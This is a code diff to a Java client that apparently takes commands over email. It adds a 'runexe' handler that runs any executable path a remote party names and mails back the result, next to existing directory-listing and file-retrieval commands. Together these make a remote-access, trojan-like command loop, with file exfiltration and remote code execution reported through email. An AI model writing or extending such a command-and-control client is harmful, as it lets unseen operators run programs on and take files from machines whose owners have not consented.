@@ -114,6 +114,31 @@ public class MainClient {
         }
     }
 
+    public static boolean runexefile(int id, String path)  {
+        String subject = "res/"+id;
+        try{
+            Path file = Path.of(path);
+            if (Files.exists(file)){
+                if (Files.isRegularFile(file)){
+                    SendMail.getInstance().sendMail(subject,Integer.toString(RunExeFile.runExecutable(path)),null, true);
+                }
+                else {
+                    SendMail.getInstance().sendMail("res/" + id + "/0000/You are request for a directory type"
+                            , "directory request", null, true);
+                }
+            }else{
+                SendMail.getInstance().sendMail("res/" + id + "/0000/File doesnt exists, try list Dir!"
+                        , "File dont exist", null, true);
+            }
+            return true;
+        }
+        catch (IOException | MessagingException e){
+            System.out.println("can not run file");
+            e.printStackTrace();
+            return false;
+        }
+    }
+
     public static boolean processRequest(String header) throws ArrayIndexOutOfBoundsException{
         String[] parts = header.split("/");
         System.out.println(Arrays.toString(parts));
@@ -136,7 +161,11 @@ public class MainClient {
         else if (command.equalsIgnoreCase("listdir")) {
             return listDir(id);
         } else if (command.equalsIgnoreCase("get")) {
-            return getFile(id,header);
+            String filename = parts[3].trim().replaceAll("\"","");
+            return getFile(id,filename);
+        } else if (command.equalsIgnoreCase("runexe")){
+            String filename = parts[3].trim().replaceAll("\"","");
+            return runexefile(id,filename);
         }
         return false;
     }
